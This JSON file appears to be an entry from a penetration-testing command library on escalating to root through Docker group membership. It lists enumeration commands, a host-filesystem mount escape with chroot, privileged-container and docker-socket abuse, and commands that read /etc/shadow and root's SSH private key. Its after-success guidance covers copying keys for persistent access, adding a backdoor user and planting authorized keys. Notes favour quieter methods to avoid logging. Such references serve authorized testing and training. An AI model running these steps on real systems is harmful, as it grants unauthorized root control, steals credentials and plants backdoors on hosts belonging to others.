{
  "category": "post-exploit",
  "subcategory": "docker-escape",
  "description": "Docker group privilege escalation commands and techniques",
  "commands": [
    {
      "id": "check-docker-group",
      "name": "Check Docker Group Membership",
      "category": "post-exploit",
      "subcategory": "docker-escape",
      "command": "groups && id",
      "description": "Verify current user is in docker group (prerequisite for docker escape)",
      "variables": [],
      "flag_explanations": {
        "groups": "Display all groups current user belongs to",
        "id": "Show user ID, group ID, and all group memberships with IDs"
      },
      "tags": [
        "DISCOVERY",
        "DOCKER",
        "ENUMERATION",
        "LINUX",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION",
        "QUICK_WIN"
      ],
      "success_indicators": [
        "docker in group list",
        "groups output contains 'docker'",
        "id output shows docker GID"
      ],
      "failure_indicators": [
        "docker not in group list",
        "Only uid/gid shown, no docker"
      ],
      "next_steps": [
        "check-docker-socket",
        "list-docker-images"
      ],
      "alternatives": [],
      "notes": "Docker group membership = root-equivalent access.\n\nIf user is in docker group, privilege escalation is trivial.",
      "prerequisites": []
    },
    {
      "id": "check-docker-socket",
      "name": "Check Docker Socket Access",
      "category": "post-exploit",
      "subcategory": "docker-escape",
      "command": "ls -la /var/run/docker.sock && docker ps 2>/dev/null",
      "description": "Verify access to Docker socket and test if docker commands work",
      "variables": [],
      "flag_explanations": {
        "ls -la": "Show socket permissions and ownership",
        "/var/run/docker.sock": "Unix socket Docker daemon listens on",
        "docker ps": "List running containers (tests docker access)",
        "2>/dev/null": "Hide errors if docker command fails"
      },
      "tags": [
        "DISCOVERY",
        "DOCKER",
        "ENUMERATION",
        "LINUX",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION"
      ],
      "success_indicators": [
        "Socket readable by user or group",
        "srw-rw---- permissions visible",
        "docker ps shows CONTAINER ID header",
        "No permission denied errors"
      ],
      "failure_indicators": [
        "Permission denied on socket",
        "Cannot connect to Docker daemon",
        "docker: command not found"
      ],
      "next_steps": [
        "list-docker-images",
        "docker-mount-escape"
      ],
      "alternatives": [],
      "notes": "Socket access confirms docker group membership is effective.\n\nEven if no containers are running, docker commands working means escalation is possible.",
      "prerequisites": [
        "check-docker-group"
      ]
    },
    {
      "id": "list-docker-images",
      "name": "List Available Docker Images",
      "category": "post-exploit",
      "subcategory": "docker-escape",
      "command": "docker images",
      "description": "Enumerate available Docker images for container escape",
      "variables": [],
      "flag_explanations": {
        "docker images": "Show all locally cached Docker images"
      },
      "tags": [
        "DISCOVERY",
        "DOCKER",
        "ENUMERATION",
        "LINUX",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION"
      ],
      "success_indicators": [
        "REPOSITORY header visible",
        "At least one image listed",
        "alpine, ubuntu, or other images shown"
      ],
      "failure_indicators": [
        "Empty list (no images)",
        "Permission denied",
        "Docker daemon not running"
      ],
      "next_steps": [
        "docker-mount-escape"
      ],
      "alternatives": [],
      "notes": "If no images available, can pull alpine (smallest):\ndocker pull alpine.\n\nHowever, may be noisy/logged.\n\nPrefer using existing images.",
      "prerequisites": [
        "check-docker-socket"
      ]
    },
    {
      "id": "docker-mount-escape",
      "name": "Docker Mount Escape to Root",
      "category": "post-exploit",
      "subcategory": "docker-escape",
      "command": "docker run -v /:/mnt --rm -it <IMAGE_NAME> chroot /mnt sh",
      "description": "Mount host filesystem in container and chroot to gain root access",
      "variables": [
        {
          "name": "<IMAGE_NAME>",
          "description": "Docker image to use (from docker images output)",
          "example": "alpine",
          "required": true
        }
      ],
      "flag_explanations": {
        "-v /:/mnt": "Mount host root filesystem at /mnt inside container",
        "--rm": "Automatically remove container when it exits (cleanup)",
        "-it": "Interactive terminal with TTY allocation",
        "chroot /mnt": "Change root to mounted host filesystem",
        "sh": "Shell to spawn (use bash if available in image)"
      },
      "tags": [
        "DOCKER",
        "EXPLOITATION",
        "LINUX",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION",
        "QUICK_WIN"
      ],
      "success_indicators": [
        "Shell prompt changes",
        "Can access /mnt/root directory",
        "Can read /mnt/etc/shadow",
        "Root shell access confirmed"
      ],
      "failure_indicators": [
        "Image not found (need to pull or use different image)",
        "Permission denied",
        "chroot: cannot change root directory"
      ],
      "next_steps": [
        "verify-docker-root"
      ],
      "alternatives": [],
      "notes": "This is the cleanest Docker escape method.\n\nHost filesystem is at /mnt.\n\nAll host files accessible as root.\n\nCan read /mnt/root/.ssh/id_rsa, /mnt/etc/shadow, modify /mnt/etc/passwd, etc.",
      "prerequisites": [
        "check-docker-socket",
        "list-docker-images"
      ],
      "troubleshooting": {
        "Image not found": "Use docker pull alpine or docker pull ubuntu, or use existing image from docker images",
        "chroot fails": "Try without chroot: docker run -v /:/mnt --rm -it alpine sh, then navigate to /mnt manually",
        "Permission denied": "Verify docker group membership with groups command"
      },
      "filled_example": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
    },
    {
      "id": "verify-docker-root",
      "name": "Verify Root Access to Host",
      "category": "post-exploit",
      "subcategory": "docker-escape",
      "command": "cat /mnt/etc/shadow && ls -la /mnt/root && cat /mnt/root/.ssh/id_rsa 2>/dev/null",
      "description": "Confirm full root access to host filesystem from container",
      "variables": [],
      "flag_explanations": {
        "cat /mnt/etc/shadow": "Read shadow file (root-only) to confirm access",
        "ls -la /mnt/root": "List root home directory contents",
        "cat /mnt/root/.ssh/id_rsa": "Attempt to read root SSH private key",
        "2>/dev/null": "Hide errors if SSH key doesn't exist"
      },
      "tags": [
        "DOCKER",
        "LINUX",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION",
        "VERIFICATION"
      ],
      "success_indicators": [
        "Shadow file contents visible (password hashes)",
        "Root directory listing shown",
        "SSH key accessible (if exists)",
        "No permission denied errors"
      ],
      "failure_indicators": [
        "Permission denied on shadow",
        "Cannot access /mnt/root",
        "Still running as low-privilege user"
      ],
      "next_steps": [],
      "alternatives": [],
      "notes": "Once verified, you have complete control over host.\n\nCan read any file, modify any file, plant backdoors, extract all credentials.",
      "prerequisites": [
        "docker-mount-escape"
      ],
      "methodology_guidance": {
        "after_success": "Extract credentials from /mnt/etc/shadow Copy root SSH key for persistent access Modify /mnt/etc/passwd to add backdoor user Add SSH public key to /mnt/root/.ssh/authorized_keys"
      }
    },
    {
      "id": "docker-privileged-escape",
      "name": "Docker Privileged Container Escape",
      "category": "post-exploit",
      "subcategory": "docker-escape",
      "command": "docker run --privileged -it <IMAGE_NAME> sh",
      "description": "Alternative Docker escape using privileged mode (more dangerous/noisy)",
      "variables": [
        {
          "name": "<IMAGE_NAME>",
          "description": "Docker image to use",
          "example": "alpine",
          "required": true
        }
      ],
      "flag_explanations": {
        "--privileged": "Give extended privileges to container (access to all host devices)",
        "-it": "Interactive terminal"
      },
      "tags": [
        "DOCKER",
        "EXPLOITATION",
        "LINUX",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION"
      ],
      "success_indicators": [
        "Container starts",
        "Can access /dev devices",
        "Can mount host filesystem manually"
      ],
      "failure_indicators": [
        "Image not found",
        "Permission denied"
      ],
      "next_steps": [],
      "alternatives": [
        "docker-mount-escape"
      ],
      "notes": "Privileged mode is more powerful but noisier than mount escape.\n\nPrefer docker-mount-escape for cleaner approach.",
      "prerequisites": [
        "list-docker-images"
      ],
      "methodology_guidance": {
        "after_success": "Mount host: mkdir /mnt/host && mount /dev/sda1 /mnt/host Access host files via mounted filesystem"
      },
      "filled_example": "docker run --privileged -it alpine sh"
    },
    {
      "id": "docker-socket-mount",
      "name": "Docker Socket Mount Abuse",
      "category": "post-exploit",
      "subcategory": "docker-escape",
      "command": "docker run -v /var/run/docker.sock:/var/run/docker.sock -it <IMAGE_NAME> sh",
      "description": "Mount Docker socket inside container to control host Docker daemon",
      "variables": [
        {
          "name": "<IMAGE_NAME>",
          "description": "Docker image with docker client installed",
          "example": "docker:latest",
          "required": true
        }
      ],
      "flag_explanations": {
        "-v /var/run/docker.sock:/var/run/docker.sock": "Mount host Docker socket inside container",
        "-it": "Interactive terminal"
      },
      "tags": [
        "DOCKER",
        "EXPLOITATION",
        "LINUX",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION"
      ],
      "success_indicators": [
        "Container starts with socket access",
        "Can run docker commands from inside container",
        "Can spawn new privileged containers"
      ],
      "failure_indicators": [
        "Socket mount fails",
        "Docker client not in image"
      ],
      "next_steps": [],
      "alternatives": [
        "docker-mount-escape"
      ],
      "notes": "Requires image with docker client installed.\n\nMore complex than direct mount escape.\n\nMainly useful if mount escape is blocked.",
      "prerequisites": [
        "list-docker-images"
      ],
      "methodology_guidance": {
        "after_success": "Inside container: docker run -v /:/mnt --rm -it alpine chroot /mnt sh Spawns nested container with host filesystem access"
      },
      "filled_example": "docker run -v /var/run/docker.sock:/var/run/docker.sock -it docker:latest sh"
    },
    {
      "id": "docker-pull-alpine",
      "name": "Pull Alpine Docker Image",
      "category": "post-exploit",
      "subcategory": "docker-escape",
      "command": "docker pull alpine",
      "description": "Download Alpine Linux image (smallest, fastest) for container escape",
      "variables": [],
      "flag_explanations": {
        "docker pull": "Download image from Docker Hub",
        "alpine": "Minimal Linux distribution (5MB)"
      },
      "tags": [
        "DOCKER",
        "ENUMERATION",
        "FILE_TRANSFER",
        "LINUX",
        "POST_EXPLOITATION"
      ],
      "success_indicators": [
        "Download progress shown",
        "Status: Downloaded newer image",
        "alpine image appears in docker images"
      ],
      "failure_indicators": [
        "Cannot connect to Docker Hub",
        "Network unreachable",
        "No internet access"
      ],
      "next_steps": [
        "docker-mount-escape"
      ],
      "alternatives": [],
      "notes": "May be logged/detected.\n\nPrefer using existing images if available.\n\nAlpine is only 5MB so downloads fast even on slow connections.",
      "prerequisites": [
        "check-docker-socket"
      ]
    }
  ]
}